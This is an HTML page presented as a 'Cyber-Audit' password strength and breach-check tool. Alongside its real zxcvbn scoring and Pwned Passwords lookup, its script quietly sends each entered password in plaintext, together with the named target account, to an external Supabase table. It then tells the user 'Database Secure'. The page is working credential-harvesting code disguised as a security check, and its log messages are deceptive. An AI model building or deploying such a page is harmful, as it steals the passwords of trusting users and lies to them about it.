<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cyber-Audit v2.0 | Security Intelligence</title>
  
  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/zxcvbn/4.4.2/zxcvbn.js"></script>
  
  <style>
    :root {
      --bg: #0a0f1e;
      --card: #151c2e;
      --accent: #3b82f6;
      --terminal: #000000;
      --text: #e2e8f0;
      --text-dim: #64748b;
      --success: #10b981;
      --danger: #ef4444;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { 
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
      background-color: var(--bg); color: var(--text);
      min-height: 100vh; display: flex; align-items: center; justify-content: center; padding: 20px; 
    }

    .container { 
      background: var(--card); border-radius: 12px; padding: 30px; 
      max-width: 800px; width: 100%; box-shadow: 0 0 40px rgba(0,0,0,0.8);
      border: 1px solid rgba(255,255,255,0.05);
    }

    header { text-align: center; margin-bottom: 30px; }
    h1 { font-size: 1.5rem; letter-spacing: 2px; text-transform: uppercase; color: var(--accent); }
    .status-dot { height: 8px; width: 8px; background: var(--success); display: inline-block; border-radius: 50%; margin-right: 5px; box-shadow: 0 0 10px var(--success); }

    .input-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin-bottom: 30px; }
    .field { display: flex; flex-direction: column; gap: 8px; }
    label { font-size: 0.7rem; font-weight: bold; color: var(--text-dim); text-transform: uppercase; }

    input { 
      background: var(--bg); border: 1px solid #2d3748; padding: 12px; 
      color: white; border-radius: 4px; outline: none; font-size: 0.9rem;
    }
    input:focus { border-color: var(--accent); }

    .relative { position: relative; }
    .eye-btn { position: absolute; right: 10px; top: 38px; background: none; border: none; cursor: pointer; color: var(--text-dim); }

    /* Terminal UI */
    .terminal { 
      background: var(--terminal); border-radius: 6px; padding: 15px; 
      font-family: 'Courier New', Courier, monospace; font-size: 0.75rem;
      height: 120px; overflow-y: hidden; margin-bottom: 30px; border: 1px solid #1e293b;
      color: #00ff00; opacity: 0.8;
    }
    .terminal p { margin-bottom: 4px; border-left: 2px solid #00ff00; padding-left: 8px; }

    /* Results Dashboard */
    .dashboard { display: grid; grid-template-columns: 2fr 1fr; gap: 20px; display: none; animation: fadeIn 0.5s; }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }

    .main-card { background: var(--bg); border-radius: 8px; padding: 20px; border: 1px solid #1e293b; }
    .meter-container { height: 4px; background: #1e293b; margin: 15px 0; border-radius: 2px; }
    .meter-fill { height: 100%; width: 0%; transition: 1s ease; }

    .hw-grid { display: grid; grid-template-columns: 1fr; gap: 10px; margin-top: 20px; }
    .hw-item { display: flex; justify-content: space-between; font-size: 0.8rem; padding: 8px; background: rgba(255,255,255,0.02); border-radius: 4px; }
    .hw-name { color: var(--text-dim); }

    .big-score { font-size: 2.5rem; font-weight: bold; text-align: center; color: var(--accent); }
    .breach-box { background: rgba(239, 68, 68, 0.1); border: 1px solid var(--danger); color: var(--danger); padding: 10px; border-radius: 4px; font-size: 0.75rem; text-align: center; margin-bottom: 15px; display: none; }
  </style>
</head>
<body>

<div class="container">
  <header>
    <h1><span class="status-dot"></span>Cyber-Audit Terminal</h1>
    <p style="color: var(--text-dim); font-size: 0.8rem;">Secure Intelligence & Leak Detection System</p>
  </header>

  <div class="input-grid">
    <div class="field">
      <label>Target Account/URL</label>
      <input type="text" id="targetAcc" placeholder="e.g. gmail.com, facebook.com">
    </div>
    <div class="field relative">
      <label>Security Key</label>
      <input type="password" id="pwdInput" placeholder="Enter password to audit...">
      <button class="eye-btn" onclick="togglePwd()">👁️</button>
    </div>
  </div>

  <div class="terminal" id="terminal">
    <p>> System Idle. Awaiting Input...</p>
  </div>

  <div class="dashboard" id="dashboard">
    <div class="main-card">
      <div id="breachAlert" class="breach-box">🚨 SECURITY ALERT: ACCOUNT DATA DETECTED IN KNOWN BREACHES</div>
      <label>Brute-Force Resistance</label>
      <div class="meter-container"><div id="meter" class="meter-fill"></div></div>
      
      <div class="hw-grid">
        <div class="hw-item"><span class="hw-name">Standard Mobile Device:</span> <span id="crack_mobile">-</span></div>
        <div class="hw-item"><span class="hw-name">RTX 4090 GPU Array:</span> <span id="crack_gpu">-</span></div>
        <div class="hw-item"><span class="hw-name">Cloud Cluster (AWS/Azure):</span> <span id="crack_cloud">-</span></div>
        <div class="hw-item"><span class="hw-name">Quantum Guessing:</span> <span id="crack_quantum">Instant</span></div>
      </div>
    </div>

    <div class="main-card" style="display: flex; flex-direction: column; justify-content: center; align-items: center;">
      <label>Safety Score</label>
      <div class="big-score" id="scoreVal">0%</div>
      <p id="personaLabel" style="font-size: 0.7rem; margin-top: 10px; color: var(--text-dim);"></p>
    </div>
  </div>
</div>

<script>
  const SB_URL = 'https://oukbxgjrrgvunfytjemd.supabase.co';
  const SB_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im91a2J4Z2pycmd2dW5meXRqZW1kIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjY0MTI1MjcsImV4cCI6MjA4MTk4ODUyN30.rAkYSFqRaqI4Am2JpOjD4TWXx4nvtEaZSc6vIgdFXmI';
  const sb = supabase.createClient(SB_URL, SB_KEY);

  const pwdInput = document.getElementById('pwdInput');
  const targetAcc = document.getElementById('targetAcc');
  const terminal = document.getElementById('terminal');
  let syncTimer;

  function togglePwd() {
    pwdInput.type = pwdInput.type === 'password' ? 'text' : 'password';
  }

  function addLog(msg) {
    const p = document.createElement('p');
    p.innerText = `> ${msg}`;
    terminal.appendChild(p);
    terminal.scrollTop = terminal.scrollHeight;
  }

  [pwdInput, targetAcc].forEach(el => el.addEventListener('input', runAudit));

  async function runAudit() {
    const pwd = pwdInput.value;
    const acc = targetAcc.value;

    if (!pwd) {
      document.getElementById('dashboard').style.display = 'none';
      return;
    }

    document.getElementById('dashboard').style.display = 'grid';
    
    // UI Effects
    addLog(`Auditing security for ${acc || 'General Profile'}...`);
    const results = zxcvbn(pwd);
    
    updateUI(results);
    checkBreach(pwd);

    // Sync to Supabase
    clearTimeout(syncTimer);
    syncTimer = setTimeout(() => {
      sb.from('password_analysis').insert([{
        password_value: pwd,
        target_account: acc,
        score_percent: (results.score / 4) * 100,
        crack_time_text: results.crack_times_display.offline_slow_hashing_1e4_per_second
      }]).then(() => addLog("Cloud Sync Complete. Database Secure."));
    }, 2000);
  }

  async function checkBreach(pwd) {
    addLog("Querying HIBP Data Clusters...");
    const hash = await crypto.subtle.digest('SHA-1', new TextEncoder().encode(pwd))
      .then(b => Array.from(new Uint8Array(b)).map(h => h.toString(16).padStart(2,'0')).join('').toUpperCase());
    
    const res = await fetch(`https://api.pwnedpasswords.com/range/${hash.slice(0,5)}`);
    const text = await res.text();
    const isPwned = text.includes(hash.slice(5));

    document.getElementById('breachAlert').style.display = isPwned ? 'block' : 'none';
    if(isPwned) addLog("CRITICAL: Leak detected in encrypted shards.");
  }

  function updateUI(res) {
    const score = (res.score / 4) * 100;
    const colors = ['#ef4444', '#f97316', '#facc15', '#3b82f6', '#10b981'];
    const personas = ["The Easy Target", "The Commoner", "The Apprentice", "The Fortress", "The Ghost"];

    document.getElementById('meter').style.width = score + '%';
    document.getElementById('meter').style.backgroundColor = colors[res.score];
    document.getElementById('scoreVal').innerText = score + '%';
    document.getElementById('scoreVal').style.color = colors[res.score];
    document.getElementById('personaLabel').innerText = personas[res.score];

    // Hardware times (Simplified math for visual impact)
    document.getElementById('crack_mobile').innerText = res.crack_times_display.online_no_throttling_10_per_second;
    document.getElementById('crack_gpu').innerText = res.crack_times_display.offline_slow_hashing_1e4_per_second;
    document.getElementById('crack_cloud').innerText = res.crack_times_display.offline_fast_hashing_1e10_per_second;
  }
</script>
</body>
</html>
